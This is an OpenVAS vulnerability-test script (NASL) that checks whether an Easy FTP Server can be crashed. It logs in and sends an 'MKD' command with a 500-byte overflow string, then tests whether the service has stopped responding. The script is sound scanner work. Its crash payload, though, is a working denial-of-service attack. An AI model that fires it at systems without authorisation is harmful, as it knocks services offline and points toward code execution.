###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_easyftp_post_auth_mkd_cmd_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Easy FTP Server POST Auth 'MKD' Command Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802023");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Easy FTP Server POST Auth 'MKD' Command Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://code.google.com/p/easyftpsvr/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17354/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101905");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to to execute
  arbitrary code and failed attempt can lead to application crash.");
  script_tag(name:"affected", value:"Easy FTP Server Version 1.7.0.11 and prior.");
  script_tag(name:"insight", value:"The flaw is due to an error while parsing 'MKD' command, which
  can be exploited to crash the FTP service by sending 'MKD' command with an
  overly long parameter.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Easy FTP Server and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(!get_port_state(ftpPort)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Accept the banner and
banner =  recv(socket:soc, length:512);
if("Powerd by BigFoolCat Ftp Server" >!< banner &&
   "220- Welcome to my ftp server" >!< banner){
  exit(0);
}

ftp_close(socket:soc);

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  exit(0);
}

user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

pass = get_kb_item("ftp/password");
if(!pass){
  pass = string("anonymous");
}

##  Exist if not able to login
ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin){
  exit(0);
}

## Send the crafted data
send(socket:soc1, data:string("MKD ", crap(length: 500, data:'A'),'\r\n'));

ftp_close(socket:soc1);

sleep (2);

soc2 = open_sock_tcp(ftpPort);
if(!soc2)
{
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc2);
